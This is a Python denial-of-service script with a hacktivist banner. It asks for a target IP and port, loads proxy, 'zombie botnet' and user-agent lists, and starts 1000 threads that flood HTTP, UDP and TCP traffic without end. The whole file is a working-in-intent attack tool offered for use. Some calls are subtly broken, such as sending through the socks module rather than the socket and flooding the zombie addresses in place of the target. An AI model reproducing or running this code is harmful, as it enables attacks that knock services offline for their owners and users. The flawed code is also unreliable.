import socket
import random
import threading
import socks
import time
import requests

credit = """
\033[1;36m
 ▄▄▄       ███▄    █  ▒█████   ███▄    █  ▄████▄   ▄▄▄      ▒███████▒▒███████▒▓██   ██▓  ██████  ▒█████   ▄████▄   ██▓
▒████▄     ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒██▀ ▀█  ▒████▄    ▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██    ▒ ▒██▒  ██▒▒██▀ ▀█  ▓██▒
▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒▒▓█    ▄ ▒██  ▀█▄  ░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░   ▒██ ██░░ ▓██▄   ▒██░  ██▒▒▓█    ▄ ▒██▒
░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░██▄▄▄▄██   ▄▀▒   ░  ▄▀▒   ░  ░ ▐██▓░  ▒   ██▒▒██   ██░▒▓▓▄ ▄██▒░██░
 ▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░▒ ▓███▀ ░ ▓█   ▓██▒▒███████▒▒███████▒  ░ ██▒▓░▒██████▒▒░ ████▓▒░▒ ▓███▀ ░░██░
 ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓
  ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ░  ▒     ▒   ▒▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒ ▓██ ░▒░ ░ ░▒  ░ ░  ░ ▒ ▒░   ░  ▒    ▒ ░
  ░   ▒      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░ ░          ░   ▒   ░ ░ ░ ░ ░░ ░ ░ ░ ░ ▒ ▒ ░░  ░  ░  ░  ░ ░ ░ ▒  ░         ▒ ░
      ░  ░         ░     ░ ░           ░ ░ ░            ░  ░  ░ ░      ░ ░     ░ ░           ░      ░ ░  ░ ░       ░
                                         ░                  ░        ░         ░ ░                       ░          
╔════════════════════════╗
║ Created by: CazzySoci  ║
║                        ║
║      𝓦𝓔𝓛𝓒𝓞𝓜𝓔           ║
║                        ║
║  We Are AnonCazzySoci  ║
║    •We don't die       ║
║    •We Multiply        ║
║    •Expect us!         ║
╚════════════════════════╝
\033[1;36m
"""


print(credit)

target_ip = input("Enter the target IP address: ")
target_port = int(input("Enter the target port: "))

# Read the Socks5 proxy list from a txt file
proxy_list = []
with open("socks5.txt", "r") as file:
    for line in file:
        proxy_ip, proxy_port = line.strip().split(":")
        proxy_list.append((proxy_ip, int(proxy_port)))

# Read the list of zombies botnets from another txt file
zombies_list = []
with open("zombies.txt", "r") as file:
    for line in file:
        zombie_ip, zombie_port = line.strip().split(":")
        zombies_list.append((zombie_ip, int(zombie_port)))

# Read the list of user agents from a txt file
user_agents = []
with open("ua.txt", "r") as file:
    for line in file:
        user_agents.append(line.strip())

# Number of threads for parallel attacks
num_threads = 1000

# Number of packets to send in each connection
num_packets = 1000

# Maximum payload size
payload_size = 65535

# DDoS attack function
def ddos_attack():
    while True:
        # Randomly select a proxy from the list
        proxy_ip, proxy_port = random.choice(proxy_list)
        socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
        socket.socket = socks.socksocket
        try:
            # Select a random zombie from the list
            zombie_ip, zombie_port = random.choice(zombies_list)

            # Randomly select a user agent from the list
            user_agent = random.choice(user_agents)

            # Connect to the zombie
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((zombie_ip, zombie_port))

            # Generate payload bytes with maximum size
            payload_bytes = b"A" * payload_size

            # Construct the HTTP request with the selected user agent and payload bytes
            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\n\r\n"
            request += payload_bytes.decode()

            # Send the attack request through the proxy
            for _ in range(num_packets):
                socks.sendall(request.encode())

            # Close the connection with the zombie
            s.close()

            # Perform UDP flood attack
            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_payload = b"A" * payload_size
            udp_socket.sendto(udp_payload, (zombie_ip, target_port))
            udp_socket.close()

            # Perform TCP flood attack
            tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp_socket.connect((zombie_ip, target_port))
            tcp_payload = b"A" * payload_size
            tcp_socket.sendall(tcp_payload)
            tcp_socket.close()

        except Exception as e:
            # Handle any errors or connection issues
            print("Error: {}".format(str(e)))

# Start the DDoS attack threads
for _ in range(num_threads):
    t = threading.Thread(target=ddos_attack)
    t.start()

print("DDoS attack initiated!")

# Keep the main thread running
while True:
    # Rotate proxies every 10 seconds
    time.sleep(10)
    random.shuffle(proxy_list)